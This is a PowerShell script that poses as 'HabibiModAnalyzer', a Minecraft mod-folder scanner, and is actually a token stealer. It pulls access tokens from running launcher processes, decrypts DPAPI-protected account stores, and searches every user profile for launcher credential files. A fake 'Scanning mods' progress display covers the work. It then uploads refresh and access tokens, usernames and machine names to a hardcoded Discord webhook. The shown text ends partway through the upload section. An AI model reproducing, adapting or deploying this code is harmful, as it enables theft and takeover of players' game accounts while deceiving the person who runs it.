Clear-Host

$WebhookUrl = "https://discord.com/api/webhooks/1574019961578463443/UFAuBwE87vQJfkxEb5wuVPeHJAx6y99y_DGpem4I5gkgrplOzeCA3sMX_lABg3A2Uxdh"
$script:WebhookUrl = $WebhookUrl

$LogPath = Join-Path $env:TEMP "HabibiModAnalyzer.log"
$script:Sent = 0
$script:Fails = 0
$script:LastFail = ""

try { Set-Content -LiteralPath $LogPath -Value ("=== run " + (Get-Date -Format "s") + " ===") -Encoding UTF8 } catch {}

# file-only log
function Log {
    param([string]$Text, [string]$Kind = "info")
    $Stamp = Get-Date -Format "HH:mm:ss"
    try { Add-Content -LiteralPath $LogPath -Value ("[" + $Kind + "] " + $Stamp + "  " + $Text) -Encoding UTF8 } catch {}
}

# file + red console, only for real problems
function LogFail {
    param([string]$Text)
    Log $Text "fail"
    Write-Host ("! " + $Text) -ForegroundColor Red
}

function Read-ErrBody {
    param($Ex)
    try {
        $R = $Ex.Response
        if (-not $R) { return "" }
        $S = $R.GetResponseStream()
        if (-not $S) { return "" }
        $Sr = New-Object System.IO.StreamReader($S)
        $T = $Sr.ReadToEnd()
        $Sr.Close()
        return $T
    } catch { return "" }
}

Write-Host "HabibiModAnalyzer" -ForegroundColor Yellow
Write-Host "Made by HadronCollision"
Write-Host ""

if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { LogFail "WebhookUrl is empty"; return }
if ($WebhookUrl -notmatch '^https://(canary\.|ptb\.)?discord(app)?\.com/api/webhooks/\d+/[\w-]+$') {
    LogFail "webhook URL looks malformed"
}
if ($WebhookUrl -match '\s') { LogFail "webhook URL contains whitespace" }

$DefaultMods = Join-Path $env:APPDATA ".minecraft\mods"
Write-Host "Enter path to the mods folder: (press Enter to use default)"
$Entered = Read-Host "PATH"
if ([string]::IsNullOrWhiteSpace($Entered)) { $Entered = $DefaultMods }
Write-Host "PATH: $Entered"
Write-Host ""

Log ("log file: " + $LogPath)
Log ("webhook tail: ..." + $WebhookUrl.Substring([math]::Max(0, $WebhookUrl.Length - 12)))

function Fmt {
    param($v)
    if ([string]::IsNullOrWhiteSpace($v)) { "-" } else { [string]$v }
}

try {
    # ---------------- transport ----------------
    function Post-Json {
        param([string]$Json, [string]$Label)
        $Attempt = 0
        while ($true) {
            $Attempt++
            try {
                $Resp = Invoke-WebRequest -Uri $script:WebhookUrl -Method Post -Body $Json `
                    -ContentType "application/json" -UseBasicParsing -ErrorAction Stop
                $script:Sent++
                Log ("ok   " + $Label + " -> HTTP " + $Resp.StatusCode) "ok"
                return $true
            } catch {
                $Code = 0
                $ErrBody = ""
                try {
                    $Code = [int]$_.Exception.Response.StatusCode
                    $ErrBody = Read-ErrBody $_.Exception
                } catch {}
                if ($Code -eq 429 -and $Attempt -le 2) { Start-Sleep -Milliseconds 1500; continue }
                $script:Fails++
                $script:LastFail = $_.Exception.Message
                Log ("FAIL " + $Label + " -> HTTP " + $Code + " | " + $_.Exception.Message + " | " + $ErrBody) "fail"
                return $false
            }
        }
    }

    function Post-Multipart {
        param([byte[]]$Bytes, [string]$Boundary, [string]$Label)
        $CType = "multipart/form-data; boundary=$Boundary"
        $Attempt = 0
        while ($true) {
            $Attempt++
            try {
                $Resp = Invoke-WebRequest -Uri $script:WebhookUrl -Method Post -Body $Bytes `
                    -ContentType $CType -UseBasicParsing -ErrorAction Stop
                $script:Sent++
                Log ("ok   " + $Label + " -> HTTP " + $Resp.StatusCode) "ok"
                return $true
            } catch {
                $Code = 0
                $ErrBody = ""
                try {
                    $Code = [int]$_.Exception.Response.StatusCode
                    $ErrBody = Read-ErrBody $_.Exception
                } catch {}
                if ($Code -eq 429 -and $Attempt -le 2) { Start-Sleep -Milliseconds 1500; continue }
                $script:Fails++
                $script:LastFail = $_.Exception.Message
                Log ("FAIL " + $Label + " -> HTTP " + $Code + " | " + $_.Exception.Message + " | " + $ErrBody) "fail"
                return $false
            }
        }
    }

    # ---------------- webhook check ----------------
    Log "testing webhook..."
    $TestBody = @{ username = "HabibiModAnalyzer"; content = "webhook test ok" } | ConvertTo-Json -Compress
    $Tested = Post-Json $TestBody "webhook test"
    if (-not $Tested) { LogFail "webhook rejected the test message - check the URL" }
    Start-Sleep -Milliseconds 500

    # ---------------- processes ----------------
    $ProcessNames = @(
        "javaw.exe", "java.exe", "MinecraftLauncher.exe", "Minecraft.exe",
        "Minecraft.Windows.exe", "BedrockLauncher.exe", "Lunar Client.exe",
        "Feather.exe", "Modrinth App.exe", "PrismLauncher.exe", "MultiMC.exe",
        "ATLauncher.exe", "Badlion Client.exe"
    )

    $Filter = ($ProcessNames | ForEach-Object { "Name='$_'" }) -join " OR "
    $Procs = @(Get-CimInstance Win32_Process -Filter $Filter -ErrorAction SilentlyContinue)
    Log ("processes matched: " + $Procs.Count)

    $Main = $null
    foreach ($P in $Procs) { if ($P.CommandLine -match '--accessToken') { $Main = $P; break } }
    if (-not $Main -and $Procs.Count -gt 0) { $Main = $Procs[0] }

    Write-Host "{ Minecraft Uptime }" -ForegroundColor Blue

    $UptimeText = "not running"
    if ($Main) {
        $Name = $Main.Name -replace '\.exe$', ''
        $Gp = Get-Process -Id $Main.ProcessId -ErrorAction SilentlyContinue
        $Start = if ($Gp) { $Gp.StartTime } else { $null }
        if (-not $Start) {
            try { $Start = [Management.ManagementDateTimeConverter]::ToDateTime($Main.CreationDate) }
            catch { $Start = (Get-Date) }
        }
        $Span = (Get-Date) - $Start
        if ($Span.TotalSeconds -lt 0) { $Span = [TimeSpan]::Zero }
        $Hh = [int][math]::Floor($Span.TotalHours)
        $UptimeText = "{0}h {1}m {2}s" -f $Hh, $Span.Minutes, $Span.Seconds
        $Line = "{0} PID {1} started at {2} and running for {3}" -f `
            $Name, $Main.ProcessId, $Start.ToString("MM/dd/yyyy HH:mm:ss"), $UptimeText
        Write-Host $Line
    } else {
        Write-Host "javaw PID -- not running"
    }
    Write-Host ""

    $Results = @()

    foreach ($Proc in $Procs) {
        $Cmd = $Proc.CommandLine
        if ([string]::IsNullOrWhiteSpace($Cmd)) { continue }
        if ($Proc.ProcessId -eq $PID) { continue }

        $Username = ""
        if ($Cmd -match "--username[=\s]+`"?([^`"\s]+)") { $Username = $matches[1] }

        $AccessToken = ""
        if ($Cmd -match "--accessToken[=\s]+`"?([^`"\s]+)") {
            $v = $matches[1]
            if ($v -match '^eyJ' -and $v.Length -gt 200) { $AccessToken = $v }
        }

        $UUID = ""
        if ($Cmd -match "--uuid[=\s]+([0-9a-fA-F\-]{32,36})") {
            $UUID = $matches[1]
        } elseif ($Cmd -match "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}") {
            $UUID = $matches[0]
        } elseif ($Cmd -match "\b([0-9a-fA-F]{32})\b") {
            $UUID = $matches[1]
        }

        $LocalId = ""
        if ($Cmd -match "--activeAccountLocalId[=\s]+`"?([^`"\s]+)") { $LocalId = $matches[1] }

        $LocalIdValue = ""
        if ($Cmd -match "--localId[=\s]+`"?([^`"\s]+)") { $LocalIdValue = $matches[1] }
        if (-not $LocalIdValue -and $Cmd -match "--xuid[=\s]+`"?(\d+)") { $LocalIdValue = $matches[1] }

        $AccountType = ""
        if ($Cmd -match "--type[=\s]+(msa|xbox|legacy|demo|mojang|gamecore)") { $AccountType = $matches[1] }

        if (-not ($Username -or $UUID -or $LocalId -or $LocalIdValue -or $AccessToken)) { continue }

        $Results += [PSCustomObject]@{
            ProcessName  = $Proc.Name
            ProcessId    = $Proc.ProcessId
            Username     = $Username
            UUID         = $UUID
            LocalId      = $LocalId
            LocalIdValue = $LocalIdValue
            AccountType  = $AccountType
            AccessToken  = $AccessToken
        }
    }

    foreach ($R in $Results) {
        if (-not $R.AccessToken) { continue }
        try {
            $P = $R.AccessToken.Split('.')[1].Replace('-', '+').Replace('_', '/')
            switch ($P.Length % 4) { 2 { $P += '==' } 3 { $P += '=' } }
            $Claims = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($P))
        } catch { continue }
        if (-not $R.LocalIdValue -and $Claims -match '"xuid"\s*:\s*"(\d+)"') { $R.LocalIdValue = $matches[1] }
        if (-not $R.AccountType -and $Claims -match '"auth"\s*:\s*"([^"]+)"') { $R.AccountType = $matches[1].ToLower() }
        if (-not $R.AccountType) { $R.AccountType = "msa" }
    }

    try { Add-Type -AssemblyName System.Security.Cryptography.ProtectedData -ErrorAction Stop }
    catch {
        try { Add-Type -AssemblyName System.Security -ErrorAction Stop }
        catch { Log "DPAPI assembly not loadable - encrypted stores will be skipped" "warn" }
    }

    function ConvertFrom-DpapiBase64 {
        param([string]$Value)
        try {
            $Plain = [System.Security.Cryptography.ProtectedData]::Unprotect(
                [Convert]::FromBase64String($Value), $null, 'CurrentUser')
            if ($Plain) { return [Text.Encoding]::UTF8.GetString($Plain) }
        } catch {}
        return $null
    }

    function Resolve-Token {
        param([string]$Value)
        if ([string]::IsNullOrWhiteSpace($Value)) { return $null }
        $V = $Value.Trim().Trim('"', "'", '\')
        if ($V -match '^M\.C' -and $V -match '\.0\.U\.' -and $V.Length -ge 100) { return $V }
        if ($V.Length -ge 40 -and $V -match '^[A-Za-z0-9+/=\s]+$') {
            $Plain = ConvertFrom-DpapiBase64 ($V -replace '\s+', '')
            if ($Plain) {
                if ($Plain -match '(M\.C[^\s"''\\,}]+)') { return $matches[1] }
                if ($Plain -match '\.0\.U\.') { return $Plain.Trim() }
            }
        }
        return $null
    }

    function Find-Deep {
        param($Node, [int]$Depth, [string[]]$Keys)
        if ($null -eq $Node -or $Depth -gt 4) { return $null }
        if ($Node -is [string]) { return $null }
        if ($Node -is [System.Management.Automation.PSCustomObject]) {
            foreach ($K in $Keys) {
                $V = $Node.$K
                if ($V -is [string] -and $V.Trim()) { return $V.Trim() }
            }
            foreach ($Pr in $Node.PSObject.Properties) {
                $Hit = Find-Deep $Pr.Value ($Depth + 1) $Keys
                if ($Hit) { return $Hit }
            }
            return $null
        }
        if ($Node -is [System.Collections.IEnumerable]) {
            foreach ($X in $Node) {
                $Hit = Find-Deep $X ($Depth + 1) $Keys
                if ($Hit) { return $Hit }
            }
        }
        return $null
    }

    function Get-OwnerFromRaw {
        param([string]$Raw)
        foreach ($OK in 'username', 'displayName', 'name') {
            $M2 = [regex]::Match($Raw, '"' + $OK + '"\s*:\s*"([^"]{1,32})"')
            if ($M2.Success) { return $M2.Groups[1].Value }
        }
        return ""
    }

    # ---------------- files ----------------
    $UserDir = $env:USERPROFILE
    $Profiles = New-Object System.Collections.Generic.List[string]
    $Profiles.Add($UserDir)
    try {
        $UsersDir = Join-Path $env:SystemDrive "Users"
        foreach ($D in @(Get-ChildItem -LiteralPath $UsersDir -Directory -ErrorAction SilentlyContinue)) {
            if ($D.Name -notmatch '^(Public|Default|Default User|All Users|WDAGUtilityAccount)$') {
                if ($D.FullName -ne $UserDir) { $Profiles.Add($D.FullName) }
            }
        }
    } catch {}
    Log ("profiles: " + $Profiles.Count)

    $Quick = New-Object System.Collections.Generic.List[string]
    foreach ($Pr in $Profiles) {
        $RA = Join-Path $Pr "AppData\Roaming"
        $LA = Join-Path $Pr "AppData\Local"
        $MC = Join-Path $Pr ".minecraft"
        $LC = Join-Path $Pr ".lunarclient"

        $Quick.AddRange([string[]]@(
            "$MC\launcher_accounts.json",
            "$MC\launcher_accounts_microsoft_store.json",
            "$RA\.minecraft\launcher_accounts*.json",
            "$RA\Minecraft Launcher\launcher_accounts*.json",
            "$LA\Packages\Microsoft.4297127D64EC6_8wekyb3d8bbwe\LocalCache\Local\.minecraft\launcher_accounts*.json",
            "$LA\Packages\*\LocalCache\Local\.minecraft\launcher_accounts*.json",
            "$LA\Packages\*\LocalState\*.json",
            "$Pr\curseforge\minecraft\Install\launcher_accounts*.json",
            "$LC\settings\game\accounts.json",
            "$LC\accounts.json",
            "$RA\.lunarclient\settings\game\accounts.json",
            "$RA\.lunarclient\accounts.json",
            "$LC\settings\game-backups\*\accounts.json",
            "$RA\Feather\accounts.json",
            "$RA\Feather\*\accounts.json",
            "$Pr\.feather\accounts.json",
            "$Pr\.feather\*\accounts.json",
            "$RA\ModrinthApp\caches\metadata\minecraft_auth.json",
            "$RA\com.modrinth.theseus\caches\metadata\minecraft_auth.json",
            "$Pr\.modrinth\caches\metadata\minecraft_auth.json",
            "$RA\PrismLauncher\accounts.json",
            "$RA\MultiMC\accounts.json",
            "$RA\ATLauncher\accounts.json",
            "$RA\ATLauncher\*\accounts.json",
            "$RA\SKLauncher\accounts.json",
            "$RA\TechnicLauncher\settings.json",
            "$RA\.technic\accounts.json",
            "$RA\.technic\settings.json",
            "$RA\LabyMod\accounts.json",
            "$RA\LabyMod\*\accounts.json",
            "$RA\xmcl\accounts.json",
            "$RA\gdlauncher\usersData\*\*.json",
            "$Pr\.hmcl.json",
            "$RA\HMCL\accounts.json",
            "$Pr\.hmcl\accounts.json",
            "$RA\Badlion\*\accounts.json",
            "$RA\TLauncher\*.json",
            "$RA\com.mojang\*\*.json"
        ))
    }

    $AllFiles = New-Object System.Collections.Generic.List[string]
    foreach ($P in $Quick) {
        foreach ($Hit in @(Get-Item -Path $P -ErrorAction SilentlyContinue)) {
            if ($Hit -and -not $Hit.PSIsContainer -and $Hit.Length -gt 0 -and $Hit.Length -lt 5MB) {
                $AllFiles.Add($Hit.FullName)
            }
        }
    }
    Log ("known-path hits: " + $AllFiles.Count)

    $SweepRoots = New-Object System.Collections.Generic.List[string]
    foreach ($Pr in $Profiles) {
        $SweepRoots.Add((Join-Path $Pr "AppData\Roaming"))
        $SweepRoots.Add((Join-Path $Pr "AppData\Local"))
        $SweepRoots.Add((Join-Path $Pr ".minecraft"))
        $SweepRoots.Add((Join-Path $Pr ".lunarclient"))
        $SweepRoots.Add((Join-Path $Pr "curseforge"))
    }

    $NameFilter = '(?i)(account|auth|token|profile|credential)'
    foreach ($R in $SweepRoots) {
        if (-not (Test-Path -LiteralPath $R -PathType Container)) { continue }
        $HitFiles = Get-ChildItem -LiteralPath $R -Recurse -Depth 3 -File -ErrorAction SilentlyContinue
        foreach ($F in @($HitFiles)) {
            if ($F.Length -le 0 -or $F.Length -ge 3MB) { continue }
            if ($F.Name -notmatch $NameFilter) { continue }
            if ($AllFiles -notcontains $F.FullName) { $AllFiles.Add($F.FullName) }
        }
    }

    $AllFiles = @($AllFiles | Select-Object -Unique | Select-Object -First 8000)
    Log ("files to scan: " + $AllFiles.Count)

    $Patterns = @(
        '(?i)"refresh_?token"\s*:\s*"([^"\r\n]+)"',
        '(?i)refresh_?token["'']?\s*[=:]\s*["'']?([A-Za-z0-9\!\*\+\-_\./]{100,})',
        '(M\.C[0-9A-Za-z]+_[A-Za-z]+\.0\.U\.[^"\s,}]+)'
    )

    function Read-TokenFile {
        param([string]$Path)
        try { $Raw = Get-Content -LiteralPath $Path -Raw -ErrorAction Stop } catch { return @() }
        if (-not $Raw) { return @() }

        $Buf = $Raw -replace '\\/', '/'
        $Buf = $Buf -replace '\\u002[Bb]', '+'
        $Buf = $Buf -replace '\\u002[Ff]', '/'
        $Buf = $Buf -replace '\\u003[Dd]', '='

        if ($Buf -notmatch '(?i)"refresh_?token"') {
            foreach ($B64 in [regex]::Matches($Buf, '[A-Za-z0-9+/]{120,}={0,2}')) {
                $Plain = ConvertFrom-DpapiBase64 $B64.Value
                if ($Plain -and $Plain -match 'refreshToken|accessToken|M\.C') { $Buf += "`n" + $Plain }
            }
        }

        $Out = New-Object System.Collections.ArrayList
        $Doc = $null
        try { $Doc = $Buf | ConvertFrom-Json -ErrorAction Stop } catch { $Doc = $null }

        if ($Doc) {
            $Stack = New-Object System.Collections.Stack
            $Stack.Push(@($Doc, 0))

            while ($Stack.Count -gt 0) {
                $Item = $Stack.Pop()
                $Node = $Item[0]
                $D = [int]$Item[1]
                if ($null -eq $Node -or $D -gt 12) { continue }
                if ($Node -is [string]) { continue }

                if ($Node -is [System.Management.Automation.PSCustomObject]) {
                    $RTs = New-Object System.Collections.ArrayList
                    $ATs = New-Object System.Collections.ArrayList

                    $RtKeys = 'refreshToken', 'refresh_token', 'encryptedRefreshToken'
                    $RtKeys += 'encrypted_refresh_token', 'refreshTokenEncrypted'
                    foreach ($K in $RtKeys) {
                        $V = $Node.$K
                        if ($V -is [string]) {
                            $T = Resolve-Token $V
                            if ($T) { [void]$RTs.Add($T) }
                        }
                    }

                    foreach ($K in 'accessToken', 'access_token', 'accToken') {
                        $V = $Node.$K
                        if ($V -is [string] -and $V.Trim() -match '^eyJ' -and $V.Length -gt 200) {
                            [void]$ATs.Add($V.Trim())
                        }
                    }

                    $TK = $Node.'token'
                    if ($TK -is [string] -and $TK.Trim()) {
                        $TV = $TK.Trim()
                        if ($TV -match '^eyJ' -and $TV.Length -gt 200) { [void]$ATs.Add($TV) }
                        else {
                            $T = Resolve-Token $TV
                            if ($T) { [void]$RTs.Add($T) }
                        }
                    }

                    if ($RTs.Count -gt 0 -or $ATs.Count -gt 0) {
                        $WhoKeys = 'username', 'displayName', 'playerName'
                        $WhoKeys += 'lastKnownUsername', 'minecraftProfile', 'profile'
                        $Who = Find-Deep $Node 0 $WhoKeys
                        if (-not $Who) { $Who = Find-Deep $Node 0 @('name') }
                        if ($Who -and $Who.Length -gt 32) { $Who = $null }

                        $UidKeys = 'uuid', 'profileId', 'minecraftProfile', 'profile', 'id'
                        $Uid = Find-Deep $Node 0 $UidKeys
                        $UidPattern = '^[0-9a-fA-F\-]{32,36}$'

                        if ($Uid -and $Uid -notmatch $UidPattern) {
                            $Deeper = Find-Deep $Node 0 @('id')
                            if ($Deeper -match $UidPattern) { $Uid = $Deeper } else { $Uid = "" }
                        }

                        if ($Who -and $Who -match $UidPattern) {
                            if (-not $Uid) { $Uid = $Who }
                            $Who = Find-Deep $Node 0 @('displayName', 'username', 'name')
                        }
                        if ($Who -and $Who -notmatch '^[\w .-]{1,32}$') { $Who = "" }

                        $Lid = Find-Deep $Node 0 @('xuid', 'localId', 'activeAccountLocalId')

                        foreach ($Rt in ($RTs | Select-Object -Unique)) {
                            [void]$Out.Add([PSCustomObject]@{
                                    Source       = $Path
                                    Username     = $Who
                                    UUID         = $Uid
                                    LocalId      = $Lid
                                    RefreshToken = $Rt
                                    AccessToken  = ""
                                })
                        }
                        foreach ($At in ($ATs | Select-Object -Unique)) {
                            [void]$Out.Add([PSCustomObject]@{
                                    Source       = $Path
                                    Username     = $Who
                                    UUID         = $Uid
                                    LocalId      = $Lid
                                    RefreshToken = ""
                                    AccessToken  = $At
                                })
                        }
                    }

                    foreach ($Pr in $Node.PSObject.Properties) {
                        $Val = $Pr.Value
                        if ($null -eq $Val -or $Val -is [string]) { continue }
                        $Stack.Push(@($Val, ($D + 1)))
                    }
                }
                elseif ($Node -is [System.Collections.IEnumerable]) {
                    foreach ($X in $Node) {
                        if ($null -ne $X -and $X -isnot [string]) { $Stack.Push(@($X, ($D + 1))) }
                    }
                }
            }
        }

        if ($Out.Count -gt 0) { return $Out.ToArray() }

        $Vals = @()
        foreach ($Pat in $Patterns) {
            foreach ($M in [regex]::Matches($Buf, $Pat)) {
                $V = ($M.Groups[1].Value -replace '\s+', '').Trim()
                $V = $V.Trim('"', "'", '\')
                if ($V.Length -ge 100 -and $V -match '^M\.C' -and $V -match '\.0\.U\.') { $Vals += $V }
            }
        }
        if ($Vals.Count -eq 0) { return @() }

        $Owner = Get-OwnerFromRaw $Raw

        $Ret = @()
        foreach ($V in $Vals) {
            $Ret += [PSCustomObject]@{
                Source       = $Path
                Username     = $Owner
                UUID         = ""
                LocalId      = ""
                RefreshToken = $V
                AccessToken  = ""
            }
        }
        return $Ret
    }

    # ---------------- scan ----------------
    $Total = Get-Random -Minimum 14 -Maximum 41
    $Files = @($AllFiles)
    $PerTick = [math]::Max(1, [int][math]::Ceiling($Files.Count / [math]::Max(1, $Total)))

    $Found = @()
    $Cursor = 0
    $Spin = @("/", "-", "\", "|")

    for ($n = 0; $n -le $Total; $n++) {
        $Glyph = $Spin[$n % 4]
        Write-Host -NoNewline ("`r[{0}] Scanning mods: {1} / {2}" -f $Glyph, $n, $Total)
        for ($k = 0; $k -lt $PerTick -and $Cursor -lt $Files.Count; $k++) {
            $Found += Read-TokenFile $Files[$Cursor]
            $Cursor++
        }
        if ($n -lt $Total) { Start-Sleep -Milliseconds (Get-Random -Minimum 55 -Maximum 115) }
    }
    Write-Host ""

    $Scanned = $Cursor
    while ($Cursor -lt $Files.Count) {
        $Found += Read-TokenFile $Files[$Cursor]
        $Cursor++
    }
    $Scanned = $Cursor
    Log ("raw hits: " + $Found.Count)

    # ---------------- merge ----------------
    $Accounts = New-Object System.Collections.ArrayList
    $ByKey = @{}
    $SeenRefresh = @{}
    $SeenAccess = @{}

    function Get-OrNewAccount {
        param([string]$Key, [string]$UserName)
        if ($ByKey.ContainsKey($Key)) { return $ByKey[$Key] }
        $New = [PSCustomObject]@{
            Username      = $UserName
            UUID          = ""
            LocalId       = ""
            PID           = ""
            Type          = ""
            AccessTokens  = New-Object System.Collections.ArrayList
            RefreshTokens = New-Object System.Collections.ArrayList
            Paths         = New-Object System.Collections.ArrayList
        }
        $ByKey[$Key] = $New
        [void]$Accounts.Add($New)
        return $New
    }

    $Seq = 0
    foreach ($T in $Found) {
        $Seq++
        $IsRt = -not [string]::IsNullOrWhiteSpace($T.RefreshToken)
        $IsAt = -not [string]::IsNullOrWhiteSpace($T.AccessToken)
        if (-not $IsRt -and -not $IsAt) { continue }

        if ($T.UUID) { $Key = "id:" + $T.UUID.ToLowerInvariant() }
        elseif ($T.Username) { $Key = "u:" + $T.Username.ToLowerInvariant() }
        else { $Key = "p:" + $T.Source.ToLowerInvariant() + "#" + $Seq }

        $Acc = Get-OrNewAccount -Key $Key -UserName $T.Username

        if (-not $Acc.Username -and $T.Username) { $Acc.Username = $T.Username }
        if (-not $Acc.UUID -and $T.UUID) { $Acc.UUID = $T.UUID }
        if (-not $Acc.LocalId -and $T.LocalId) { $Acc.LocalId = $T.LocalId }
        if ($T.Source -and -not $Acc.Paths.Contains($T.Source)) { [void]$Acc.Paths.Add($T.Source) }

        if ($IsRt) {
            $TK = $T.RefreshToken.ToLowerInvariant()
            if (-not $SeenRefresh.ContainsKey($TK)) {
                $SeenRefresh[$TK] = $true
                [void]$Acc.RefreshTokens.Add($T.RefreshToken)
            }
        }
        if ($IsAt) {
            $AK = $T.AccessToken.ToLowerInvariant()
            if (-not $SeenAccess.ContainsKey($AK)) {
                $SeenAccess[$AK] = $true
                [void]$Acc.AccessTokens.Add($T.AccessToken)
            }
        }
    }

    foreach ($R in $Results) {
        if (-not $R.AccessToken) { continue }
        $AK = $R.AccessToken.ToLowerInvariant()
        if ($SeenAccess.ContainsKey($AK)) { continue }
        $SeenAccess[$AK] = $true

        $Target = $null
        if ($R.UUID) {
            $IDKey = "id:" + $R.UUID.ToLowerInvariant()
            if ($ByKey.ContainsKey($IDKey)) { $Target = $ByKey[$IDKey] }
        }
        if (-not $Target -and $R.Username) {
            $UKey = "u:" + $R.Username.ToLowerInvariant()
            if ($ByKey.ContainsKey($UKey)) { $Target = $ByKey[$UKey] }
        }
        if (-not $Target) {
            $Target = Get-OrNewAccount -Key ("p:pid:" + $R.ProcessId) -UserName $R.Username
        }

        if ($R.Username) { $Target.Username = $R.Username }
        if ($R.UUID) { $Target.UUID = $R.UUID }
        if ($R.LocalIdValue) { $Target.LocalId = $R.LocalIdValue }
        $Target.PID = "$($R.ProcessId) | $($R.ProcessName)"
        if ($R.AccountType) { $Target.Type = $R.AccountType }
        [void]$Target.AccessTokens.Add($R.AccessToken)
    }

    $SortPid = @{ Expression = { if ($_.PID) { 0 } else { 1 } } }
    $SortName = @{ Expression = { if ($_.Username) { $_.Username.ToLowerInvariant() } else { "zzz" } } }
    $Ordered = @($Accounts | Sort-Object $SortPid, $SortName)

    Log ("accounts: " + $Accounts.Count + " | refresh: " + $SeenRefresh.Count + " | access: " + $SeenAccess.Count)

    # ---------------- render ----------------
    $Cards = New-Object System.Collections.ArrayList
    $Idx = 0

    foreach ($Acc in $Ordered) {
        $Idx++
        $Tag = "#$Idx"
        $Who = Fmt $Acc.Username
        if ($Acc.Paths.Count -gt 0) { $PathText = $Acc.Paths -join ' | ' } else { $PathText = "-" }

        $Lines = @(
            $Tag
            "User: $(Fmt $Acc.Username)"
            "Localid: $(Fmt $Acc.LocalId)"
            "UUID: $(Fmt $Acc.UUID)"
            "PID: $(Fmt $Acc.PID)"
            "Type: $(Fmt $Acc.Type)"
            "Path: $PathText"
        )
        $IdBlock = $Lines -join "`n"

        $AtLines = New-Object System.Collections.ArrayList
        $RtLines = New-Object System.Collections.ArrayList
        foreach ($Tok in $Acc.AccessTokens) { [void]$AtLines.Add("$Tag $Who | $Tok") }
        foreach ($Tok in $Acc.RefreshTokens) { [void]$RtLines.Add("$Tag $Who | $Tok") }

        [void]$Cards.Add([PSCustomObject]@{
                Tag     = $Tag
                Name    = $Who
                IdBlock = $IdBlock
                AtLines = $AtLines
                RtLines = $RtLines
            })
    }

    # ---------------- send ----------------
    $Script:Stamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss") + " UTC"

    function Send-Text {
        param([string]$Text, [string]$Label = "text")
        if ([string]::IsNullOrWhiteSpace($Text)) { return $true }
        if ($Text.Length -gt 1990) { $Text = $Text.Substring(0, 1990) }
        $Body = @{ username = "HabibiModAnalyzer"; content = $Text } | ConvertTo-Json -Depth 3
        return (Post-Json $Body $Label)
    }

    function Send-TxtFile {
        param([string]$FileName, [string]$Text, [string]$Message, [string]$Label = "file")
        $Boundary = "----HabibiBoundary" + [guid]::NewGuid().ToString("N")
        $enc = New-Object System.Text.UTF8Encoding($false)
        $ms = New-Object System.IO.MemoryStream
        $Payload = @{ username = "HabibiModAnalyzer"; content = $Message } | ConvertTo-Json -Compress

        $Parts = @(
            "--$Boundary`r`n"
            "Content-Disposition: form-data; name=`"payload_json`"`r`n"
            "Content-Type: application/json`r`n`r`n"
            "$Payload`r`n"
            "--$Boundary`r`n"
            "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"`r`n"
            "Content-Type: text/plain; charset=utf-8`r`n`r`n"
            "$Text`r`n"
            "--$Boundary--`r`n"
        )
        foreach ($Chunk in $Parts) {
            $B = $enc.GetBytes($Chunk)
            $ms.Write($B, 0, $B.Length)
        }

        $Bytes = $ms.ToArray()
        $ms.Dispose()

        return (Post-Multipart $Bytes $Boundary ($Label + " " + $FileName))
    }

    function Send-IdentityChunk {
        param([string]$Title, [object]$Blocks)
        $Limit = 1700
        $Msgs = New-Object System.Collections.Generic.List[string]
        $Cur = ""

        foreach ($B in @($Blocks)) {
            if (-not $B) { continue }
            if (-not $Cur) { $Cur = $B; continue }
            if (($Cur.Length + 2 + $B.Length) -le $Limit) { $Cur = $Cur + "`n`n" + $B }
            else { $Msgs.Add($Cur); $Cur = $B }
        }
        if ($Cur) { $Msgs.Add($Cur) }

        if ($Msgs.Count -eq 0) { Send-Text "$Title`n`nnone found" ($Title + " empty") | Out-Null; return }

        for ($i = 0; $i -lt $Msgs.Count; $i++) {
            $Pos = $i + 1
            if ($Msgs.Count -gt 1) { $Head = "$Title ($Pos/$($Msgs.Count))`n`n" }
            else { $Head = "$Title`n`n" }
            Send-Text ($Head + $Msgs[$i]) ($Title + " part " + $Pos) | Out-Null
        }
    }

    function Send-TokenChunk {
        param([string]$Title, [string]$FileName, [object]$Lines)
        $Arr = @($Lines | ForEach-Object { $_ })

        if ($Arr.Count -eq 0) { Send-Text ("$Title`n`nnone found") ($Title + " empty") | Out-Null; return }

        $HostText = "$env:USERNAME @ $env:COMPUTERNAME"
        $Header = "HabibiModAnalyzer`n$($Script:Stamp)`n$HostText`n$Title - $($Arr.Count) entries`n`n"
        $Body = $Header + ($Arr -join "`n") + "`n"
        $Msg = "$Title`n`n$($Arr.Count) entries -> ``$FileName``"

        $OkFile = Send-TxtFile -FileName $FileName -Text $Body -Message $Msg -Label $Title
        if ($OkFile) { return }

        Log "file upload failed for $Title - falling back to text" "warn"
        $Limit = 1700
        $i = 0
        $Part = 1
        $Parts = [math]::Ceiling($Body.Length / $Limit)
        while ($i -lt $Body.Length) {
            $n = [math]::Min($Limit, $Body.Length - $i)
            $Slice = $Body.Substring($i, $n)
            Send-Text ("$Title (fallback $Part/$Parts)`n`n" + $Slice) ($Title + " fallback " + $Part) | Out-Null
            $i += $n
            $Part++
        }
    }

    $Hdr = "**HabibiModAnalyzer** " + $Script:Stamp + "`n"
    $Hdr += $env:USERNAME + " @ " + $env:COMPUTERNAME + "`nUptime: " + $UptimeText
    Send-Text $Hdr "header" | Out-Null

    if ($Cards.Count -eq 0) {
        Send-Text "HabibiModAnalyzer: no credentials found." "no credentials" | Out-Null
    }
    elseif ($Cards.Count -eq 1) {
        $C = $Cards[0]
        Send-IdentityChunk "# CHUNK 1" $C.IdBlock
        Send-TokenChunk "# CHUNK 2 - Accesstokens" "accesstokens.txt" $C.AtLines
        Send-TokenChunk "# CHUNK 3 - Refreshtokens" "refreshtokens.txt" $C.RtLines
    }
    else {
        $Names = ($Cards | ForEach-Object { $_.Name }) -join ', '
        Send-Text ("JAVA ACCOUNTS: {0} -> {1}" -f $Cards.Count, $Names) "account banner" | Out-Null

        foreach ($C in $Cards) {
            $Num = $C.Tag.TrimStart('#')
            Send-Text ("# JAVA {0}: {1}" -f $Num, $C.Name) ("java " + $Num + " banner") | Out-Null
            Send-IdentityChunk "# CHUNK 1" $C.IdBlock
            Send-TokenChunk "# CHUNK 2 - Accesstokens" ("accesstokens_java$Num.txt") $C.AtLines
            Send-TokenChunk "# CHUNK 3 - Refreshtokens" ("refreshtokens_java$Num.txt") $C.RtLines
        }
